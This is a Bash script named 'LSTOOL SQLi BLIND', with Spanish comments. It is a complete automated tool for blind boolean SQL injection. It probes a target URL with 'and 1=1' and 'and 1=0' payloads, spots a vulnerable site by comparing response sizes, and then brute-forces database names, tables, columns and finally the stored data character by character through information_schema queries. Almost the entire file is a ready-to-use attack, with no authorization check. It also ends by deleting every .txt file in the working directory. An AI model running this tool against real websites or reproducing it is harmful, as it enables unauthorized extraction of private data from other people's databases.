#!/bin/bash

reqURL () {
    
    local urlPrueba="$1"
    curl -s "$urlPrueba" > respWeb.txt 
    local tamResp="$(wc -c <'respWeb.txt')" 

    if [[ $tamResp -eq $sizeWebCorrecta ]]; then #comprobamos el tamaño de la respuesta de la prueba y el tamaño correcto
     #echo "prueba con exito"
     return 1;
    else
     #echo "prueba erronea"
     return 0;
    fi        
}

checkNumber () {

    #parametros que nos iran enviando a medida que se profundice la extraccion
    nombreBBDD="$1"
    nombreTabla="$2"
    nombreColumna="$3"

    if [ $step -eq 1 ]; then #paso 1 es sacar numero de bbdd existentes
        echo "LOOKING FOR NUMBER OF DATABASES..."
        local pruebaNum="%20and%20(select%20count(schema_name)%20from%20information_schema.schemata)="
    elif [ $step -eq 2 ]; then #paso 2 es sacar numero de tablas
        echo "LOOKING FOR NUMBER OF TABLES..."
        local pruebaNum="%20and(select%20count(table_name)%20from%20information_schema.tables%20where%20table_schema='$nombreBBDD')="
    elif [ $step -eq 3 ]; then #paso 3 es sacar numero de columnas
        echo "LOOKING FOR NUMBER OF COLUMNS..."
        local pruebaNum="%20and%20(select%20count(column_name)%20from%20information_schema.columns%20where%20table_name='$nombreTabla')="
    else #paso 4 es sacar numero de datos
        echo "LOOKING FOR NUMBER OF DATA..."
        local pruebaNum="%20and%20(select%20count($nombreColumna)%20from%20$nombreTabla)="
    fi

    exito=0
    numPrueba=0;
    while [ $exito != 1 ]
    do
        if [ $sintaxOption -eq 1 ]; then #tipo integer
            url="$pruebaNum$numPrueba"
        elif [ $sintaxOption -eq 2 ]; then  #tipo comilla simple
            url="'$pruebaNum$numPrueba%20--%20-"
        elif [ $sintaxOption -eq 3 ]; then #tipo comilla doble
            url="\"$pruebaNum$numPrueba%20--%20-"
        fi
        
        #resp=$(reqURL $url)
        reqURL $urlWeb$url
        resp=$?
        
        if [[ "$resp" == 1 && $step -eq 1 ]]; then
            printf "FOUND!! NUMBER OF DATABASES: \033[91m$numPrueba\033[0m \n" #para que salga en rojito 
            numBBDD=$numPrueba     
            exito=1
        elif [[ "$resp" == 1 && $step -eq 2 ]]; then
            printf "FOUND!! NUMBER OF TABLES: \033[91m$numPrueba\033[0m \n" 
            numTables=$numPrueba     
            exito=1
        elif [[ "$resp" == 1 && $step -eq 3 ]]; then
            printf "FOUND!! NUMBER OF COLUMNS: \033[91m$numPrueba\033[0m \n" 
            numColumns=$numPrueba     
            exito=1
        elif [[ "$resp" == 1 && $step -eq 4 ]]; then
            printf "FOUND!! NUMBER OF DATA: \033[91m$numPrueba\033[0m \n" 
            numData=$numPrueba     
            exito=1
        else
                
            ((numPrueba++))
        fi
    done
    echo "- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - "
}

checkLength () {

    #parametros que nos iran enviando a medida que se profundice la extraccion
    nombreBBDD="$1"
    nombreTabla="$2"
    nombreColumna="$3"

    if [ $step -eq 1 ]; then #paso 1 es sacar tamanio de bbdd existentes
        echo "LOOKING FOR LENGTH OF DATABASES..."
        local pruebaLength="%20and%20(select%20length(schema_name)%20from%20information_schema.schemata%20limit%20" #0,1)=1"
        local numMax=$numBBDD
    elif [ $step -eq 2 ]; then #paso 2 es sacar tamanio de tablas
        echo "LOOKING FOR LENGTH OF TABLES..."
        local pruebaLength="%20and%20(select%20length(table_name)%20from%20information_schema.tables%20where%20table_schema='$nombreBBDD'%20limit%20" #0,1)=1"
        local numMax=$numTables
    elif [ $step -eq 3 ]; then #paso 3 es sacar tamanio de columnas
        echo "LOOKING FOR LENGTH OF COLUMNS..."
        local pruebaLength="%20and%20(select%20length(column_name)%20from%20information_schema.columns%20where%20table_name='$nombreTabla'%20limit%20" #0,1)=1"
        local numMax=$numColumns
    else #paso 4 es sacar tamanio de datos
        echo "LOOKING FOR LENGTH OF DATA..."
        local pruebaLength="%20and%20(select%20length($nombreColumna)%20from%20$nombreTabla%20limit%20" #0,1)=1 
        local numMax=$numData
    fi

    for ((i=0; i<"$numMax"; i++))
    do
        for ((j=1; j<"$TAMMAX_letras"; j++)) 
        do

            if [ $sintaxOption -eq 1 ]; then #tipo integer
                url="$pruebaLength$i,1)=$j"
            elif [ $sintaxOption -eq 2 ]; then  #tipo comilla simple
                url="'$pruebaLength$i,1)=$j%20--%20-"
            elif [ $sintaxOption -eq 3 ]; then #tipo comilla doble
                url="\"$pruebaLength$i,1)=$j%20--%20-"
            fi 
            
            reqURL $urlWeb$url
            resp=$?
            
            if [[ "$resp" == 1 && $step -eq 1 ]]; then
                #create a variable name based on the value of i
                nombreVarBBDD="numLetras_BBDD$i"
                # assign a value to the variable with the dynamically created name
                declare "$nombreVarBBDD=$j"
                #echo "$nombreVarBBDD" esto sirve para guardar el nombre compuesto de varianles -> numLetras_BBDD"0", numLetras_BBDD"1", ...etc
                #echo "${!nombreVarBBDD}" esto es -> 18, 9 (el valor dentro de numLetras_BBDD0, 1 etc)
                #echo "$numLetras_BBDD0" esto es -> 18 (es lo mismo que ${!nombreVarBBDD})
                printf "FOUND!! DATABASE NUMBER \033[91m$((i+1))\033[0m NAME HAS \033[91m${!nombreVarBBDD}\033[0m CHARACTERS \n"
                j="$TAMMAX_letras"
            elif [[ "$resp" == 1 && $step -eq 2 ]]; then
                nombreVarTabla="numLetras_Tabla$i"
                declare "$nombreVarTabla=$j"
                printf "FOUND!! TABLE NUMBER \033[91m$((i+1))\033[0m NAME HAS \033[91m${!nombreVarTabla}\033[0m CHARACTERS \n"
                j="$TAMMAX_letras"
            elif [[ "$resp" == 1 && $step -eq 3 ]]; then
                nombreVarColumn="numLetras_Tabla$i"
                declare "$nombreVarColumn=$j"
                printf "FOUND!! COLUMN NUMBER \033[91m$((i+1))\033[0m NAME HAS \033[91m${!nombreVarColumn}\033[0m CHARACTERS \n"  #para que se vea rojito
                j="$TAMMAX_letras"
            elif [[ "$resp" == 1 && $step -eq 4 ]]; then
                nombreVarData="numLetras_Data$i"
                declare "$nombreVarData=$j"
                printf "FOUND!! DATA NUMBER \033[91m$((i+1))\033[0m NAME HAS \033[91m${!nombreVarData}\033[0m CHARACTERS \n" #para que se vea rojito
                j="$TAMMAX_letras"
            fi
        done
    done
    echo "- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - "

}

checkChars () {

    #parametros que nos iran enviando a medida que se profundice la extraccion
    nombreBBDD="$1"
    nombreTabla="$2"
    nombreColumna="$3"

    TAMMIN_ascii=48 #(si qro nums) o 65 (si qro empezar por letra A)
    TAMMAX_ascii=122 #(=z)

    if [ $step -eq 1 ]; then #paso 1 es sacar caracteres de bbdd existentes
        local pruebaChars="%20and%20ascii(substring((select%20schema_name%20from%20information_schema.schemata%20limit%20" #2,1),1,1))="
        local numMax=$numBBDD
        local palabraEcho="DATABASE"
    elif [ $step -eq 2 ]; then #paso 2 es sacar caracteres de tablas
        local pruebaChars="%20and%20ascii(substring((select%20table_name%20from%20information_schema.tables%20where%20table_schema='$nombreBBDD'%20limit%20" #0,1)1,1))="
        local numMax=$numTables
        local palabraEcho="TABLE"
    elif [ $step -eq 3 ]; then #paso 3 es sacar caracteres de columnas
        local pruebaChars="%20and%20ascii(substring((select%20column_name%20from%20information_schema.columns%20where%20table_name='$nombreTabla'%20limit%20" #0,1)1,1))=a"
        local numMax=$numColumns
        local palabraEcho="COLUMN"
    else #paso 4 es sacar caracteres de datos
        local pruebaChars="%20and%20ascii(substring((select%20$nombreColumna%20from%20$nombreTabla%20limit%20" #0,1)3,1))=a"
        local numMax=$numData
        local palabraEcho="CHARACTER"
    fi
    
    echo "LOOKING FOR THE CHARACTERS OF THE $palabraEcho/s..."

    for ((i=0; i<"$numMax"; i++)) #maximo a buscar es el num de cuantas bbdd/tablas/columnas/datos hay
    do
    #create a variable name based on the value of i
    nombreVar="nombre$i"
        for ((j=1; j<"$TAMMAX_letras"; j++)) #maximo a buscar es el num d letras q hayamos dicho (30 en este caso)
        do 
            for ((k="$TAMMIN_ascii"; k<"$TAMMAX_ascii"; k++))
            do
                if [ $sintaxOption -eq 1 ]; then #tipo integer
                    url="$pruebaChars$i,1),$j,1))=$k"
                    elif [ $sintaxOption -eq 2 ]; then  #tipo comilla simple
                    url="'$pruebaChars$i,1),$j,1))=$k%20--%20-"
                    elif [ $sintaxOption -eq 3 ]; then #tipo comilla doble
                    url="\"$pruebaChars$i,1),$j,1))=$k%20--%20-"
                fi 
                
                reqURL $urlWeb$url
                resp=$?
            
                if [ "$resp" == 1 ]; then
                    #convert from decimal to ascii
                    char=$(printf \\$(printf '%03o' $k))

                    if [ "$j" == 1 ]; then #si es el primer caracter sacado de la palabra
                        #echo "WE FOUND THE FIRST CHARACTER OF THE DATABASE NUMBER $i ! --> $k"
                        # assign a value to the variable with the dynamically created name
                        declare "$nombreVar=$char"                    
                    else #si no es el primer caracter
                        #echo "WE FOUND ANOTHER CHARACTER! --> $k"
                        declare "$nombreVar=${!nombreVar}$char"
                    fi				
                    k="$TAMMAX_ascii";
                fi
            done
        done
        printf "THE SEARCH FOR $palabraEcho NUMBER \033[91m$((i+1))\033[0m NAME IS COMPLETED. IT IS: \033[91m${!nombreVar}\033[0m \n" #para que se vea rojito
    done
    echo "- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - "

}

continuarIny () {

    echo "- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - "
    echo "- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - "
    echo "Do you want to continue with the injection? (y/n)"
    read -r resp
    echo "- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - "
    echo "- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - "

    if [[ "$resp" == "y" ]]; then

        echo "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⢀⡀⠀⠀⠀"
        echo "⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡖⠁⠀⠀⠀⠀⠀⠀⠈⢲⣄⠀⠀"
        echo "⠀⠀⠀⠀⠀⠀⠀⠀⣼⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣧⠀⠀"
        echo "⠀⠀⠀⠀⠀⠀⠀⣸⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣇⠀⠀"
        echo "⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⢀⣀⣤⣤⣤⣤⣀⡀⠀⢸⣿⣿⠀⠀⠀"
        echo "⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣔⢿⡿⠟⠛⠛⠻⢿⡿⣢⣿⣿⡟⠀⠀⠀⠀"
        echo "⠀⠀⠀⠀⣀⣤⣶⣾⣿⣿⣿⣷⣤⣀⡀⢀⣀⣤⣾⣿⣿⣿⣷⣶⣤⡀⠀⠀"
        echo "⠀⠀⢠⣾⣿⡿⠿⠿⠿⣿⣿⣿⣿⡿⠏⠻⢿⣿⣿⣿⣿⠿⠿⠿⢿⣿⣷⡀⠀"
        echo "⠀⢠⡿⠋⠁⠀⠀⢸⣿⡇⠉⠻⣿⠇⠀⠀⠸⣿⡿⠋⢰⣿⡇⠀⠀⠈⠙⢿⡄⠀"
        echo "⠀⡿⠁⠀⠀⠀⠀⠘⣿⣷⡀⠀⠰⣿⣶⣶⣿⡎⠀⢀⣾⣿⠇⠀⠀⠀⠀⠈⢿⠀"
        echo "⠀⡇⠀⠀⠀⠀⠀⠀⠹⣿⣷⣄⠀⣿⣿⣿⣿⠀⣠⣾⣿⠏⠀⠀⠀⠀⠀⠀⢸⠀"
        echo "⠀⠁⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⢇⣿⣿⣿⣿⡸⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠈⠀"
        echo "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
        echo "⠀⠀⠀⠐⢤⣀⣀⢀⣀⣠⣴⣿⣿⠿⠋⠙⠿⣿⣿⣦⣄⣀⠀⠀⣀⡠⠂⠀⠀⠀"
        echo "⠀⠀⠀⠀⠀⠈⠉⠛⠛⠛⠛⠉⠀⠀⠀⠀⠀⠈⠉⠛⠛⠛⠛⠋⠁⠀⠀⠀⠀⠀"
        echo "- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -"
        echo "- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -"
        
        TAMMAX_letras=30 #tamanio maximo de longitud de caracteres a buscar en los nombres
        local continuar=0

        step=1
        checkNumber #checkeamos numero de bbdd
        checkLength #checkeamos longitud de texto de cada bbdd
        checkChars #checkeamos caracteres de las bbdd 
        
        #mensaje pidiendo info para saber de q bbdd sacar datos
        echo "DATABASES DUMP COMPLETED. FROM WHICH DATABASE DO YOU WANT TO EXTRACT THE TABLES?"
        read -r database

        step=2
        
        while [ $continuar != 1 ]
        do
            checkNumber $database #checkeamos numero de tablas
            checkLength $database #checkeamos longitud de texto de cada tablas
            checkChars $database #checkeamos caracteres de las tablas 

            #mensaje pidiendo info para saber de q tabla sacar datos
            echo "TABLES DUMP COMPLETED."
            echo "Do you want to dump the tables of another database (y/n) ?"
            read -r resp
            if [ "$resp" == "n" ]; then
                continuar=1 
            elif [ "$resp" == "y" ]; then
                echo "FROM WHICH DATABASE DO YOU WANT TO EXTRACT THE TABLES?"
                read -r database
            fi 
        done
        
        echo "FROM WHICH TABLE DO YOU WANT TO EXTRACT THE COLUMNS?"
        read -r table

        continuar=0
        step=3

        while [ $continuar != 1 ]
        do
            checkNumber $database $table #checkeamos numero de columnas
            checkLength $database $table #checkeamos longitud de texto de cada columnas
            checkChars $database $table #checkeamos caracteres de las columnas 

            #mensaje pidiendo info para saber de q tabla sacar datos
            echo "COLUMNS DUMP COMPLETED." 
            echo "Do you want to dump the columns of another table (y/n) ?"
            read -r resp
        
            if [ "$resp" == "n" ]; then
                continuar=1 
            elif [ "$resp" == "y" ]; then
                echo "FROM WHICH TABLE DO YOU WANT TO EXTRACT THE COLUMNS?"
                read -r table
            fi 
        done
        
        echo "FROM WHICH COLUMN DO YOU WANT TO EXTRACT THE DATA?"
        read -r column    
        
        continuar=0
        step=4

        while [ $continuar != 1 ]
        do
            checkNumber $database $table $column #checkeamos numero de contenido
            checkLength $database $table $column #checkeamos longitud de texto de cada contenido
            checkChars $database $table $column #checkeamos caracteres de las contenido 

            echo "DATA DUMP COMPLETED." 
            echo "Do you want to dump the data of another column (y/n) ?"
            read -r resp
        
            if [ "$resp" == "n" ]; then
                continuar=1 
            elif [ "$resp" == "y" ]; then
                echo "FROM WHICH COLUMN DO YOU WANT TO EXTRACT THE DATA?"
                read -r column
            fi 
        done    
            
        echo "THANK YOU FOR USING LSTOOL SQL BLIND!"


    elif [[ "$resp" != "y" && "$resp" != "n" ]]; then
        echo "Invalid character. Exiting..."
    fi

}

echo "---------------------------------------------------------------------------"
echo "---------------------------------------------------------------------------"
figlet LSTOOL SQLi BLIND
echo "⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄"
echo "⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⡀⠄⠄⠄⠄"
echo "⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⠄⠄⠄⠁⠄⠁⠄⠄⠄⠄⠄"
echo "⠄⠄⠄⠄⠄⠄⣀⣀⣤⣤⣴⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣦⣤⣤⣄⣀⡀⠄⠄⠄⠄⠄"
echo "⠄⠄⠄⠄⣴⣿⣿⡿⣿⢿⣟⣿⣻⣟⡿⣟⣿⣟⡿⣟⣿⣻⣟⣿⣻⢿⣻⡿⣿⢿⣷⣆⠄⠄⠄"
echo "⠄⠄⠄⢘⣿⢯⣷⡿⡿⡿⢿⢿⣷⣯⡿⣽⣞⣷⣻⢯⣷⣻⣾⡿⡿⢿⢿⢿⢯⣟⣞⡮⡀⠄⠄"
echo "⠄⠄⠄⢸⢞⠟⠃⣉⢉⠉⠉⠓⠫⢿⣿⣷⢷⣻⣞⣿⣾⡟⠽⠚⠊⠉⠉⠉⠙⠻⣞⢵⠂⠄⠄"
echo "⠄⠄⠄⢜⢯⣺⢿⣻⣿⣿⣷⣔⡄⠄⠈⠛⣿⣿⡾⠋⠁⠄⠄⣄⣶⣾⣿⡿⣿⡳⡌⡗⡅⠄⠄"
echo "⠄⠄⠄⢽⢱⢳⢹⡪⡞⠮⠯⢯⡻⡬⡐⢨⢿⣿⣿⢀⠐⡥⣻⡻⠯⡳⢳⢹⢜⢜⢜⢎⠆⠄⠄"
echo "⠄⠄⠠⣻⢌⠘⠌⡂⠈⠁⠉⠁⠘⠑⢧⣕⣿⣿⣿⢤⡪⠚⠂⠈⠁⠁⠁⠂⡑⠡⡈⢮⠅⠄⠄"
echo "⠄⠄⠠⣳⣿⣿⣽⣭⣶⣶⣶⣶⣶⣺⣟⣾⣻⣿⣯⢯⢿⣳⣶⣶⣶⣖⣶⣮⣭⣷⣽⣗⠍⠄⠄"
echo "⠄⠄⢀⢻⡿⡿⣟⣿⣻⣽⣟⣿⢯⣟⣞⡷⣿⣿⣯⢿⢽⢯⣿⣻⣟⣿⣻⣟⣿⣻⢿⣿⢀⠄⠄"
echo "⠄⠄⠄⡑⡏⠯⡯⡳⡯⣗⢯⢟⡽⣗⣯⣟⣿⣿⣾⣫⢿⣽⠾⡽⣺⢳⡫⡞⡗⡝⢕⠕⠄⠄⠄"
echo "⠄⠄⠄⢂⡎⠅⡃⢇⠇⠇⣃⣧⡺⡻⡳⡫⣿⡿⣟⠞⠽⠯⢧⣅⣃⠣⠱⡑⡑⠨⢐⢌⠂⠄⠄"
echo "⠄⠄⠄⠐⠼⣦⢀⠄⣶⣿⢿⣿⣧⣄⡌⠂⠢⠩⠂⠑⣁⣅⣾⢿⣟⣷⠦⠄⠄⡤⡇⡪⠄⠄⠄"
echo "⠄⠄⠄⠄⠨⢻⣧⡅⡈⠛⠿⠿⠿⠛⠁⠄⢀⡀⠄⠄⠘⠻⠿⠿⠯⠓⠁⢠⣱⡿⢑⠄⠄⠄⠄"
echo "⠄⠄⠄⠄⠈⢌⢿⣷⡐⠤⣀⣀⣂⣀⢀⢀⡓⠝⡂⡀⢀⢀⢀⣀⣀⠤⢊⣼⡟⡡⡁⠄⠄⠄⠄"
echo "⠄⠄⠄⠄⠄⠈⢢⠚⣿⣄⠈⠉⠛⠛⠟⠿⠿⠟⠿⠻⠻⠛⠛⠉⠄⣠⠾⢑⠰⠈⠄⠄⠄⠄⠄"
echo "⠄⠄⠄⠄⠄⠄⠄⠑⢌⠿⣦⡡⣱⣸⣸⣆⠄⠄⠄⣰⣕⢔⢔⠡⣼⠞⡡⠁⠁⠄⠄⠄⠄⠄⠄"
echo "⠄⠄⠄⠄⠄⠄⠄⠄⠄⠑⢝⢷⣕⡷⣿⡿⠄⠄⠠⣿⣯⣯⡳⡽⡋⠌⠄⠄⠄⠄⠄⠄⠄⠄⠄"
echo "⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠙⢮⣿⣽⣯⠄⠄⢨⣿⣿⡷⡫⠃⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄"
echo "⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠘⠙⠝⠂⠄⢘⠋⠃⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄"
echo "⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄"
echo "⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄"
echo "---------------------------------------------------------------------------"
echo "---------------------------------------------------------------------------"
#sleep 1
echo "WEBSITE: $1"
urlWeb=$1
echo "---------------------------------------------------------------------------"
echo "---------------------------------------------------------------------------"
echo "TRYING TO SEE IF WEBSITE IS VULNERABLE TO SQL INJECTION..."
echo "---------------------------------------------------------------------------"
echo "---------------------------------------------------------------------------"

#sleep 3
#pruebas para ver si web es sqli vulnerable

int1="$1%20and%201=1" #%20 para los espacios que sino curl se raya
int2="$1%20and%201=0"
coma1="$1'%20and%20'1'='1"
coma2="$1'%20and%20'1'='0"
dcoma1="$1\"%20and%20\"1\"=\"1"
dcoma2="$1\"%20and%20\"1\"=\"0"

#guardamos respuesta de la web a las urls maliciosas con las pruebas 

curl -s $1 > website.txt 
curl -s $int1 > pruebaInteger1n1.txt
curl -s $int2 > pruebaInteger1n0.txt
curl -s $coma1 > pruebaComa1n1.txt
curl -s $coma2 > pruebaComa1n0.txt
curl -s $dcoma1 > pruebaDComa1n1.txt
curl -s $dcoma2 > pruebaDComa1n0.txt


#guardamos tamaño de las respuestas

sizeWeb="$(wc -c <'website.txt')" #guardamos cuanto ocupa/tamaño de la respuesta (cuantas palabras tiene la web respondida)
sizeWebI="$(wc -c <'pruebaInteger1n1.txt')"
sizeWebI2="$(wc -c <'pruebaInteger1n0.txt')"
sizeWebC="$(wc -c <'pruebaComa1n1.txt')"
sizeWebC2="$(wc -c <'pruebaComa1n0.txt')"
sizeWebDC="$(wc -c <'pruebaDComa1n1.txt')"
sizeWebDC2="$(wc -c <'pruebaDComa1n0.txt')"

#cramos array con estos valores

declare -a tamWeb
tamWeb=($sizeWebI $sizeWebI2 $sizeWebC $sizeWebC2 $sizeWebDC $sizeWebDC2)

#prueba para comprobar si ha habido cambio en la web en alguna de las pruebas

#si es vulnerable
echo "- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - "
echo "- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - "
if [ "${tamWeb[0]}" != "${tamWeb[1]}" ] && [ "${tamWeb[0]}" -eq "$sizeWeb" ]; then #condicion para ver si es vulnerable: que la negada cambie y que la true sea igual a la pag original (una sola condicion??)
 echo "SUCCESS!! WEBSITE IS VULNERABLE TO INTEGER SQL INJECTION"
 #guardamos variables que utilizaremos para pruebas BOOL
 sizeWebCorrecta=$sizeWeb
 sizeWebIncorrecta=$sizeWebI2
 #opcion 1,2 o 3 para saber con que trabajar
 sintaxOption=1
 #funcion continuar
 continuarIny
elif [ "${tamWeb[2]}" != "${tamWeb[3]}" ] && [ "${tamWeb[2]}" -eq "$sizeWeb" ]; then
 echo "SUCCESS!! WEBSITE IS VULNERABLE TO SINGULAR QUOTE SQL INJECTION"
 #guardamos variables que utilizaremos para pruebas BOOL
 sizeWebCorrecta=$sizeWeb
 sizeWebIncorrecta=$sizeWebC2
 #opcion 1,2 o 3 para saber con que trabajar
 sintaxOption=2
 #funcion continuar
 continuarIny
elif [ "${tamWeb[4]}" != "${tamWeb[5]}" ] && [ "${tamWeb[4]}" -eq "$sizeWeb" ]; then
 echo "SUCCESS!! WEBSITE IS VULNERABLE TO DOUBLE QUOTE INJECTION"
 #guardamos variables que utilizaremos para pruebas BOOL
 sizeWebCorrecta=$sizeWeb
 sizeWebIncorrecta=$sizeWebDC2
 #opcion 1,2 o 3 para saber con que trabajar
 sintaxOption=3
 #funcion continuar
 continuarIny
#si no es vulnerable
else
 echo "⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⣵⣶⣬⣉⡻⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿"
 echo "⣿⣿⣿⣿⣿⣿⣿⠿⠿⠛⣃⣸⣿⣿⣿⣿⣿⣿⣷⣦⢸⣿⣿⣿⣿⣿⣿⣿⣿"
 echo "⣿⣿⣿⣿⣿⣿⢡⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣭⣙⠿⣿⣿⣿⣿⣿"
 echo "⣿⣿⣿⣿⡿⠿⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⢸⣿⣿⣿⣿"
 echo "⣿⣿⣿⠋⣴⣾⣿⣿⣿⡟⠁⠄⠙⣿⣿⣿⣿⠁⠄⠈⣿⣿⣿⣿⣈⠛⢿⣿⣿"
 echo "⣿⣿⣇⢸⣿⣿⣿⣿⣿⣿⣦⣤⣾⣿⣿⣿⣿⣦⣤⣴⣿⣿⣿⣿⣿⣷⡄⢿⣿"
 echo "⣿⠟⣋⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿"
 echo "⢁⣾⣿⣿⣿⣿⣿⡉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⣹⣿⣿⣿⣦⠙"
 echo "⣾⣿⣿⣿⣿⣿⣿⣿⣦⣄⣤⣶⣿⣿⣿⣿⣿⣿⣷⣦⣄⣤⣾⣿⣿⣿⣿⣿⣧"
 echo "⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏"
 echo "⣷⣦⣙⠛⠿⢿⣿⣿⡿⠿⠿⠟⢛⣛⣛⡛⠻⠿⠿⠿⣿⣿⣿⣿⠿⠟⢛⣡⣾"
 echo ""
 echo "FAILURE. WEBSITE IS NOT VULNERABLE TO SQL INJECTION"
 echo "- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - "
 echo "- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - "
fi

#borramos todos los ficheros generados
rm *.txt 
echo "---------------------------------------------------------------------------"
echo "---------------------------------------------------------------------------"
figlet Goodbye ! 
echo "---------------------------------------------------------------------------"
echo "---------------------------------------------------------------------------"

